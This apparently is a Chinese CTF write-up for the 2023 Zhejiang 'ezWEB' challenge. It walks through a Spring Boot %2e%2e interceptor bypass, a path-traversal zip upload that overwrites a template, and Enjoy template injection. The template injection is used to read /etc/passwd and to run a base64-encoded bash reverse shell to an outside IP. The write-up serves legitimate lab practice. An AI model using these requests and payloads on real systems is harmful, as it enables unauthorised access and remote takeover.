
# \[CTF 复现计划\]2023 浙江大学生省赛决赛 ezWEB

原创 datou

[↓↓↓](javascript:)  
  
大头 SEC  
  
[↑↑↑](javascript:)

*2023-11-15 15:56* *发表于浙江*

收录于合集 #CTF 复现计划 7 个

## 前言

“大头 SEC”公众号专注于 CTF、AWD、AWD Plus、RDG 等竞赛题目复现。

在“大头 SEC”公众号正式开始运营以前，“CTF 复现计划”已经运营了一段时间，“CTF 复现计划”旨在解决各位 CTFer 在赛后因平台关闭导致无法复现的问题。截止 10 月 18 日，“CTF 复现计划”已经在语雀公开分享 20 余个复现环境，30 余篇 WriteUp。（“CTF 复现计划”语雀直达链接：https://www.yuque.com/dat0u/ctf）

而在“大头 SEC”公众号中会分享“CTF 复现计划”中相对精彩的竞赛题目，同样也提供复现环境及 WriteUp。

## 题目信息

> 本题涉及知识点：Java 代码审计、低版本 SpringBoot 权限绕过、zip-slip、Enjoy 引擎注入、springMacroRequestContext、高版本 JDK 绕 Module

-   • 题目类型：CTF
    
-   • 题目名称：2023 浙江大学生省赛决赛 ezWEB
    
-   • 题目镜像：ccr.ccs.tencentyun.com/lxxxin/public:zjctf2023\_final\_ezweb
    
-   • 内部端口：9124
    
-   • 题目附件：启动容器后，输入框中输入../ezWEB-0.0.1-SNAPSHOT.jar 下载附件
    

## 启动脚本

请确保本地安装了 docker 命令，并且确保 12345 端口未被占用，然后以 root 权限运行下方命令，运行成功后会返回一串 16 进制字符串（此为容器 ID），表示容器运行成功，接着打开 Chrome 或者 Firefox 浏览器，用浏览器访问 12345 端口

```bash
docker run -it -d -p 12345:9124 -e FLAG=flag{8382843b-d3e8-72fc-6625-ba5269953b23} ccr.ccs.tencentyun.com/lxxxin/public:zjctf2023_final_ezweb
```

## WriteUp

启动容器，访问页面，提示下载 hint.txt

![图片](assets/1701827499-51373f8f3f24e205f4013f613d2af224.png "null")

image.png

hint.txt 中提示可以访问../ezWEB-0.0.1-SNAPSHOT.jar 下载附件，且题目使用 jdk18

![图片](assets/1701827499-a177e08f27560c2618469ab0f401592e.png "null")

image.png

下载附件反编译后，目录结构如下：

![图片](assets/1701827499-c937826a6c87effe1f472495e566d99b.png "null")

image.png

先看 pom 依赖，这里用了 SpringBoot 2.3.0

![图片](assets/1701827499-1ae4e049675432938e9c6ce72c1da4c2.png "null")

image.png

用了以下依赖：

-   • Enjoy 作为模板引擎
    
-   • ant 1.9.11 存在 zip-slip（后面说）
    

![图片](assets/1701827499-965462e05f0d5ecee9dd1c9643c455d8.png "null")

image.png

再看 Intercept 拦截器，当 preHandle 返回 true 时才会继续执行 Controller 部分代码，所以需要让 if 返回 true；

想要让 if 返回 true，就需要 uri 里包括`..`、`./`且 uri 以`/index`开头

![图片](assets/1701827499-9228fe1c2a50e2ed0677035a40a17a66.png "null")

image.png

本题还将 Enjoy 模板引擎与 SpringBoot 进行了整合：

-   • Enjoy 模板引擎官方整合文档：https://jfinal.com/doc/6-10
    
-   • 这里的模板存储路径为/usr/src/app/template
    
-   • 模板后缀为.html
    

![图片](assets/1701827499-0dc82a357e40cc40a9f21b5a3eb2b08b.png "null")

image.png

再看 AdminController 路由：

-   • 这里的 Controller 都是直接返回 Model，没有@ResponseBody，所以/admin/hello 路由会做模板渲染，如果我们访问/admin/helllo，会去渲染 admin/hello.html 并返回
    

![图片](assets/1701827499-f26ccb2b34b007fe1be234a22a292ba3.png "null")

image.png

那么如何绕过 Intercept 拦截器的权限验证呢？

注意到，本题的 SpringBoot 版本为 2.3.0，对应的 Spring 版本为 5.2.6，该版本的 Spring 在使用 preHandle 拦截器时，如果使用 request.getRequestURI 判断可能存在权限绕过，在本题存在以下绕过手法：

-   • 传入`/index/%2e%2e/admin/hello`，request.getRequestURI() 会获取到`/index/%2e%2e/admin/hello`  
    • 传入 `/index/%2e%2e/admin/hello` ，request.getRequestURI（）会获取到 `/index/%2e%2e/admin/hello`
    
-   • `/index/%2e%2e/admin/hello`是符合 if 判断的，并且 preHandle 会返回 true
    
-   • 在CoyoteAdapter#postParseRequest中（Tomcat）会做URL解码和`/index/../`的路径合并
    
-   • 在 Mapper#internalMapWrapper（Tomcat）中会对 wrapperPath 赋值
    
-   • 在 UrlPathHelper#getPathWithinServletMapping（Spring）中会做路由比较，进入到符合条件的 Controller
    

具体代码跟进可以参考下方文章：

-   • https://forum.butian.net/share/829  
    • https://forum.butian.net/share/829
    

将下方请求打过去，返回 500 表示成功绕过，如果返回 200 则为绕过失败，因为目前靶机没有 admin/hello.html 模板文件，所以会返回 500

```bash
GET /index/%2e%2e/admin/hello HTTP/1.1
Host: 192.168.59.190:32771
```

![图片](assets/1701827499-6f41b04d4469e632f8b64451a322d416.png "null")

image.png

权限绕过之后就要思考如何攻击了，本题一共两个 Controller，分别是：UserController、AdminController，接下来仔细分析这两个 Controller 的功能点：

IndexController 提供了文件读取的功能，但是过滤了传入的参数，flag 和 proc 都被过滤了

![图片](assets/1701827499-592e154ee30b9eeb54bfd4bbeb984745.png "null")

image.png

AdminController 提供了文件上传的功能，仅允许我们上传 zip 文件，并且解压路径是直接做字符串拼接且无过滤，因此这里可以用`../`穿越路径让其解压到 template 目录中

![图片](assets/1701827499-3b98e325d0f83915d0cf5496f632c24a.png "null")

image.png

上传后的文件会交给 UploadService 解压，跟进 UploadService#extractAllForZipFile，这里用的是 ant 1.9.11，该版本存在 zip-slip，但由于这里可以拼接路径穿越到 template 目录，因此就不用 zip-slip 了

整理一下到目前的思路：

1.  1. 利用 SpringBoot 的%2e 特性未授权访问到/admin/upload 路由
    
2.  2. 往/admin/upload 上传一个 zip 文件，名为 admin.zip，包含 hello.html，并在文件名位置做穿越，将 hello.html 覆盖到/template/admin/hello.html 中
    
3.  3. 同样利用 SpringBoot 的%2e 特性未授权访问到/admin/hello，渲染 hello.html 完成攻击
    

那么 hello.html 的内容应该怎么写呢？参考 enjoy 模板引擎的官方文档：

-   • https://jfinal.com/doc/6-4
    

在 jfinal 中存在`#include`指令，可以读取文件

![图片](assets/1701827499-65fa90656d202b57a3c29df46ae53970.png "null")

image.png

所以，我们编写一个 hello.html，并将其打包为 admin.zip

```bash
#include("../../../../../../../../../../../../../etc/passwd")
```

![图片](assets/1701827499-c2478824c6ebb5e5d7986fa40b00285d.png "null")

image.png

由于 python 的 request 会自动对%2e 做解码和路径归并，BurpSuite 的 Paste from file 经常出现文件内容损坏，所以这里选择使用 Yakit 发送：

```bash
POST /index/%2e%2e/admin/upload HTTP/1.1
Host: 192.168.59.190:32781
Content-Length: 184
Content-Type: multipart/form-data; boundary=------------------------AgbYfFaagxYfgukTWgbjdFUizVgtnOrqnpGiRFkn

--------------------------AgbYfFaagxYfgukTWgbjdFUizVgtnOrqnpGiRFkn
Content-Disposition: form-data; name="file"; filename="../template/admin.zip"

{{file(/path/to/admin.zip)}}
--------------------------AgbYfFaagxYfgukTWgbjdFUizVgtnOrqnpGiRFkn--
```

![图片](assets/1701827499-d619e735aa95912580577b60a240d11e.png "null")

image.png

然后再构造请求去访问/admin/hello 页面即可：

```bash
GET /index/%2e%2e/admin/hello HTTP/1.1
Host: 192.168.59.190:32781
```

![图片](assets/1701827499-456e1854042d495b6a7fb81648785e74.png "null")

image.png

至此，我们已经完成了任意文件读取。

那么如何命令执行呢？阅读 Enjoy 模板的官方文档：

-   • https://jfinal.com/doc/6-3
    

在 5.0.2 版本以前，是可以通过调用静态方法的，但题目版本为 5.1.2

![图片](assets/1701827499-8c6bfcca6eb33a5c22fe199ca5ecf1f2.png "null")

image.png

这里命令执行的方法为：利用 springMacroRequestContext 获取 jfinalViewResolver 这个 Bean，然后调用 engine 去将 setStaticMethodExpression 设置为 true

![图片](assets/1701827499-2d3b13d5901204adc342da3f3cff598b.png "null")

image.png

完整的做法如下：

-   • 编写一个 hello.html，内容为第一行所示，开启 Enjoy 模板的静态方法支持
    
-   • 因为题目为 JDK18，调用 JShell 执行命令不受 Module 限制
    
-   • 将 hello.html 和 upload.html 打包为 admin.zip
    

```bash
#(springMacroRequestContext.webApplicationContext.getBean('jfinalViewResolver').engine.setStaticMethodExpression(true))
#((jdk.jshell.JShell::create()).eval('Runtime.getRuntime().exec(new String("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzI5OTk5IDA+JjE=}|{base64,-d}|{bash,-i}"));'))
zip admin.zip hello.html upload.html
```

![图片](assets/1701827499-1ca28fe30655d6339bba146e3fd44a7e.png "null")

image.png

上传 admin.zip

![图片](assets/1701827499-e0119760f2157032659dc0867948dad4.png "null")

image.png

访问/admin/hello 路由，开启 Enjoy 模板的静态方法支持

![图片](assets/1701827499-501afc266f2ba08e049206b47b0e3970.png "null")

image.png

调用 JShell 实现命令执行

![图片](assets/1701827499-1c319466355d934a88f3ae184871568c.png "null")

image.png

成功反弹 shell（当然，hint 提示不出网，可以尝试注入内存马，或者将命令执行结果写入到临时文件后读取）

![图片](assets/1701827499-ca01fad54782fc73fc8961afc4b4b74f.png "null")

image.png

当然，本题还有以下几个延伸：

直接在 filename 中穿越路径可能算是半个非预期，出题人预期应该是 zip-slip，题目对文件名做了 startsWith 验证，所以可以 slip 一个`./../../template/admin/hello.html`压缩包绕过验证并覆盖

![图片](assets/1701827499-4f3f80dcc54c322937e903d54928c8ba.png "null")

image.png

除了使用 JShell 绕过 Module，还有一些其他姿势可以绕过，参考下方链接：

-   • https://t.zsxq.com/14SBDZVP2
    
-   • https://t.zsxq.com/146VKiXjB
    
-   • https://t.zsxq.com/14TECp9cK
    

## “CTF 复现计划”交流群

1.  1\. 语雀群文档：https://www.yuque.com/dat0u/ctf
    
2.  2. 有需要复现的 CTF 赛题可以直接 call 群主（大头）
    
3.  3. 本群提供赛题制作、赛题 WriteUp 编写等服务
    
4.  4. 各位师傅可以随意拉人
    
5.  5\. 因群聊已超 200 人，无法通过二维码扫描加入，可以加 vx：DatouYoo（备注 CTF 复现计划）
    

![图片](assets/1701827499-ac80167163469dbb8ce2c73ab0773689.jpg "null")

image.png

![](assets/1701827499-de4e5a91c4ed24cfd257df2588886791.png)

**大头 SEC**

本公众号专注于 CTF、AWD、AWD Plus、RDG 等竞赛题目复现

8 篇原创内容

公众号
